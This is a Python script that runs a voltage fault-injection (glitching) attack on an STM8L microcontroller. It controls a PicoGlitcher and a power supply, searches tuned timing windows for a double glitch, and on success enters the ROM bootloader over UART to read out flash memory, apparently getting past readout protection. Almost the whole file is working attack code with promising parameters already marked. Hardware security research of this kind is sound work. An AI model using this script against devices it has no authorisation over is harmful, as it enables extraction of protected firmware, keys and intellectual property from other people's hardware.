#!/usr/bin/env python3

import argparse
import itertools
import pathlib
import random
import subprocess
import sys
import time
from dotenv import load_dotenv
import serial
from binascii import hexlify
from findus import Database, PicoGlitcher, STM8Programmer

from findus.findus import BlockTimeoutError
from projects.stm8l.utils.pushover import send_pushover_notification
from .utils.psu import PS3005D

RX_PIN = 27


class UARTProgrammer:
    def __init__(self, port: str, proc: str = "stm8gal", baud: int = 115200):
        self.proc = proc
        self.port = port
        self.baud = baud

    def disable_uart(self):
        subprocess.run(["pinctrl", "set", "14,15", "ip", "pn"], check=True)

    def enable_uart(self):
        subprocess.run(["pinctrl", "set", "14,15", "a0"], check=True)

    def read_memory(
        self, start: int, end: int, outfile: str = "dump.bin"
    ) -> pathlib.Path:
        cmd = [
            self.proc,
            "-b", str(self.baud),
            # "-B",
            # "-v", "0",
            "-R", "0",
            "-p",
            self.port,
            "-r", hex(start), hex(end),
            outfile,
        ]

        subprocess.run(cmd, check=True)

        return pathlib.Path(outfile).resolve()
    
    def __del__(self):
        self.disable_uart()

class STM8BootloaderSerial:
    ACK   = 0x79
    NACK  = 0x1F
    SYNCH = 0x7F

    def __init__(self, port, baud=115200, timeout=1.0):
        """
        port: e.g. 'COM5', '/dev/ttyUSB0', '/dev/ttyACM0'
        baud: STM8 ROM bootloader autobauds on 0x7F; 115200 is a good default
        timeout: read timeout in seconds
        """
        self.port = port
        self.baud = baud
        self.timeout = timeout
        self.ser = None
        self.parity_mode = 'N'  # remembers which parity worked

    # ---------- context manager ----------
    def __enter__(self):
        self._open(parity='N')
        return self

    def __exit__(self, exc_type, exc, tb):
        self.close()

    # ---------- public API ----------
    def enter_bootloader(self, tries=2, auto_parity=True):
        """
        Send 0x7F and wait for ACK. Tries 8N1 first; if that fails and auto_parity=True, tries 8E1.
        Returns True on success or raises RuntimeError.
        """
        # First try 8N1
        self._ensure_open(parity='N')
        if self._sync(tries=tries):
            self.parity_mode = 'N'
            return True

        if auto_parity:
            # Retry with 8E1
            self._open(parity='E')
            if self._sync(tries=tries):
                self.parity_mode = 'E'
                return True

        raise RuntimeError("Bootloader sync failed (no ACK after 0x7F)")

    def read_memory(self, start_addr, length):
        """
        Read 'length' bytes from 'start_addr' using 0x11, chunking up to 256 bytes per frame.
        Returns bytes. Raises RuntimeError on NACK/timeout.
        """
        self._ensure_open(parity=self.parity_mode)
        data = bytearray()
        remaining = length
        addr = start_addr
        while remaining > 0:
            n = remaining if remaining <= 256 else 256
            blk = self._read_block(addr, n)
            if blk is None:
                raise RuntimeError("Read failed (NACK/timeout)")
            data += blk
            addr += n
            remaining -= n
        return bytes(data)

    def close(self):
        if self.ser:
            try:
                self.ser.close()
            finally:
                self.ser = None

    # ---------- internals ----------
    def _open(self, parity='N'):
        if self.ser:
            self.close()
        self.ser = serial.Serial(
            self.port,
            baudrate=self.baud,
            bytesize=serial.EIGHTBITS,
            parity=serial.PARITY_NONE if parity == 'N' else serial.PARITY_EVEN,
            stopbits=serial.STOPBITS_ONE,
            timeout=self.timeout,
            write_timeout=1.0,
        )
        # clean pipe
        self.ser.reset_input_buffer()
        self.ser.reset_output_buffer()

    def _ensure_open(self, parity='N'):
        if (self.ser is None) or not self.ser.is_open:
            self._open(parity=parity)
        else:
            # switch parity on the fly if needed
            desired = serial.PARITY_NONE if parity == 'N' else serial.PARITY_EVEN
            if self.ser.parity != desired:
                # safest is to reopen
                self._open(parity=parity)

    def _sync(self, tries=2):
        for _ in range(tries):
            self.ser.reset_input_buffer()
            self.ser.write(bytes([self.SYNCH]))
            a = self._read_exact(1, overall_timeout=0.8)
            if a == bytes([self.ACK]):
                return True
            time.sleep(0.05)
        return False

    def _read_block(self, addr, count):
        # 1) Command + complement
        self._write(b"\x11\xEE")
        if not self._expect_ack(): return None

        # 2) Address (MSB..LSB) + XOR checksum
        a3=(addr>>24)&0xFF; a2=(addr>>16)&0xFF; a1=(addr>>8)&0xFF; a0=addr&0xFF
        chksum = (a3 ^ a2 ^ a1 ^ a0) & 0xFF
        self._write(bytes([a3,a2,a1,a0,chksum]))
        if not self._expect_ack(): return None

        # 3) Length (N-1) + complement
        n1 = (count - 1) & 0xFF
        self._write(bytes([n1, (0xFF - n1) & 0xFF]))
        if not self._expect_ack(): return None

        # 4) Data
        return self._read_exact(count, overall_timeout=2.0)

    def _expect_ack(self):
        b = self._read_exact(1)
        return (b == bytes([self.ACK]))

    def _write(self, b):
        self.ser.write(b)
        self.ser.flush()

    def _read_exact(self, n, overall_timeout=None):
        """
        Read exactly n bytes or return None on timeout.
        Uses a simple loop over Serial.read() to honor an overall timeout.
        """
        if overall_timeout is None:
            overall_timeout = self.timeout

        deadline = time.monotonic() + overall_timeout
        buf = bytearray()
        while len(buf) < n:
            chunk = self.ser.read(n - len(buf))
            if chunk:
                buf += chunk
                continue
            if time.monotonic() >= deadline:
                return None
        return bytes(buf)



class BootloaderProfilingGlitcher(PicoGlitcher):
    def init(self, *args, **kwargs):
        super().init(*args, **kwargs)

        self.pico_glitcher.pyb.exec_raw_no_follow(
            "import machine\n" f"adc = machine.ADC({RX_PIN})\n"
        )

    def read_success_flag(self) -> bool:
        out = self.pico_glitcher.pyb.exec_raw(f"print(int(adc.read_u16()))\n")

        return int(out[0].strip()) > 5000

    def classify(self, state: bytes) -> str:
        color = "C"
        if b"expected" in state:
            color = "G"
        elif b"timeout" in state:
            color = "Y"
        elif b"success" in state:
            color = "R"
        return color


class Main:
    def __init__(self, args):
        self.args = args
        self.parameters = {
            "length": 24,
            "voltage": 1.10,
            "delay1": [
                # range(28450, 28540),
                # range(28950, 29020),
                # range(29240, 29260),
                # range(29400, 29500),
                range(29460, 29520),  # very good
                # range(30200, 30270),
                # range(31950, 32020),
            ],
            "delay2": [
                range(34690, 34750),  # seems most promising
                range(35150, 35250),  # was range(35190, 35240), also very promising
                range(35680, 35730),
                range(36210, 36234),
                range(37200, 37250),
                range(37450, 37550),
            ],
        }

        self.glitcher = BootloaderProfilingGlitcher()
        self.glitcher.init(port=args.rpico, enable_vtarget=False)
        self.glitcher.change_config_and_reset("mux_vinit", "3.3")
        self.glitcher.init(port=args.rpico, enable_vtarget=False)

        self.glitcher.rising_edge_trigger()
        self.glitcher.set_multiplexing()

        self.glitcher.power_cycle_reset(0.01)

        self.db = Database(
            sys.argv + [f"{k}={v}" for k, v in self.parameters.items()],
            resume=args.resume,
            nostore=args.no_store,
            column_names=["voltage", "delay1", "delay2", "length"],
        )
        self.start_time = int(time.time())
        self.psu = PS3005D(port=args.psu)

        if args.programmer:
            self.programmer = UARTProgrammer(port=self.args.programmer)
            self.programmer.disable_uart()
            self.stm_programmer = STM8BootloaderSerial(port=self.args.programmer)

    def run(self):
        exp_id = 0

        self.psu.set_voltage(self.parameters["voltage"])
        time.sleep(0.1)
        self.psu.set_current_limit(0.2)
        time.sleep(0.1)
        self.psu.turn_on()
        time.sleep(0.1)

        while True:
            length = self.parameters["length"]
            delay1_flattened = list(itertools.chain.from_iterable(self.parameters["delay1"]))
            delay1 = random.choice(delay1_flattened)
            delay2_flattened = list(itertools.chain.from_iterable(self.parameters["delay2"]))
            delay2 = random.choice(delay2_flattened)
            delay1 = round(delay1 / 4) * 4  # ensure delay is multiple of 4
            delay2 = round(delay2 / 4) * 4
            delay2 = delay2 - (
                delay1 + self.parameters["length"]
            )  # make delay2 relative

            mul_config = {
                "t1": length,
                "v1": "VI1",
                "t2": delay2,
                "v2": "3.3",
                "t3": length,
                "v3": "VI1",
            }
            self.glitcher.arm_multiplexing(delay1, mul_config)
            self.glitcher.reset(50e-6)  # reset for 50us
            success = False

            try:
                self.glitcher.block(timeout=1)
                time.sleep(100e-6)  # wait for rx to go high if success
                success = self.glitcher.read_success_flag()

                if success:
                    if self.args.programmer:
                        self.programmer.enable_uart()
                        self.stm_programmer.enter_bootloader()
                        # self.stm_programmer.read_memory(
                        #     0x1000,
                        #     0xFF,
                        #     outfile=f"eeprom-{exp_id}.bin",
                        # )
                        flash = self.stm_programmer.read_memory(
                            0x8000,
                            # 0x2000,
                            64,
                        )
                        print(hexlify(flash)[:16], "...")
                        self.programmer.disable_uart()
                        # self.programmer.read_memory(
                        #     start=0x1000,
                        #     end=0x10FF,
                        #     outfile=f"eeprom-{exp_id}.bin",
                        # )
                        # self.programmer.read_memory(
                        #     start=0x8000,
                        #     end=0x9FFF,
                        #     outfile=f"flash-{exp_id}.bin",
                        # )
                        # self.programmer.disable_uart()

                    # send_pushover_notification(
                    #     user_key=os.getenv("PUSHOVER_USER_KEY"),
                    #     app_token=os.getenv("PUSHOVER_APP_TOKEN"),
                    #     message=f"Successful glitch! with delays={delay1},{delay2} ns, length={length} ns, voltage={self.parameters['voltage']:.2f} V",
                    #     title="Successful glitch",
                    # )

                    if self.args.programmer:
                        break

                    state = b"success"
                else:
                    state = b"expected"
            except Exception as e:
                print(e)
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_reset(0.2)
                time.sleep(0.2)
                state = b"timeout"

            color = self.glitcher.classify(state)
            if success:
                self.db.insert(
                    exp_id,
                    self.parameters["voltage"] * 100,
                    delay1,
                    delay2,
                    length,
                    color,
                    state,
                )
            speed = self.glitcher.get_speed(self.start_time, exp_id)
            experiment_base_id = self.db.get_base_experiments_count()
            print(
                self.glitcher.colorize(
                    f"[+] Experiment {exp_id}\t{experiment_base_id}\t({speed})\t{self.parameters['voltage']:.2f}\t{delay1}\t{delay2}\t{length}\t{color}\t{state}",
                    color,
                )
            )
            exp_id += 1


if __name__ == "__main__":
    load_dotenv()

    p = argparse.ArgumentParser(
        description="STM8L single-glitch via external trigger + success pin"
    )
    p.add_argument(
        "--rpico",
        default="/dev/ttyACM0",
        required=True,
        help="PicoGlitcher serial port",
    )
    p.add_argument(
        "--psu", default="/dev/ttyACM1", required=True, help="PSU serial port"
    )
    p.add_argument(
        "--programmer",
        default="/dev/ttyAMA0",
        help="STM8 bootloader programmer serial port",
    )
    p.add_argument("--resume", action="store_true", help="Resume previous database run")
    p.add_argument(
        "--no-store", action="store_true", help="Do not write results to the database"
    )
    p.add_argument("--ic", required=True, help="IC number")
    args = p.parse_args()

    try:
        Main(args).run()
    except KeyboardInterrupt:
        print("Interrupted, exiting.")
        sys.exit(1)
